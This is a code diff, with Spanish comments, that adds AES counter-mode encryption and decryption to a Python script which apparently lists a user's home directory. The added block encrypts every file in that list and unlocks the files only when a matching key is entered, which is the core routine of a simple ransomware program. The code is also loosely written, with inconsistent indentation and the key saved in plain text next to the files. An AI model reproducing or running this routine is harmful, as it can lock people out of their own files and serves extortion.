@@ -5,6 +5,8 @@ import os
 import socket
 import random
 import hashlib
+from Crypto.Util import Counter
+from Crypto.Cipher import AES
 
 
 	# listar el contenido del directorio HOME
@@ -94,6 +96,36 @@ def discover(key):
 	key_file.write(key)
 	key_file.close()
 
+		# verificamos si existe la clave simetrica
+	if os.path.exists('key_file'):
+			# pedimos la clave para desencriptar
+		key1 = raw_input('Key: ')
+		key_file = open('key_file', 'r')
+		key = key_file.read().split('\n') # borramos saltos de linea
+		key = ''.join(key) # .join convierte una lista en una cadena de texto
+
+			# comprobamos que la contraseña sea correcta
+		if key1 == key:
+			c = Counter.new(128)
+			crypto = AES.new(key, AES.MODE_CTR, counter=c)
+			cryptarchives = crypto.decrypt
+
+				# desecriptamos los archivos
+			for element in lista:
+				encrypt_and_decrypt(element, cryptarchives)
+
+	else:
+		c = Counter.new(128)
+			# encriptamos
+		crypto = AES.new(key, AES.MODE_CTR, counter=c)
+		key_file = open('key_file', 'w+')
+		key_file.write(key)
+		key_file.close()
+		cryptarchives = crypto.encrypt
+
+			# recorrer cada elemento de la lista para encriptar los archivos
+		for element in lista:
+			encrypt_and_decrypt(element,cryptarchives)
 
 
 
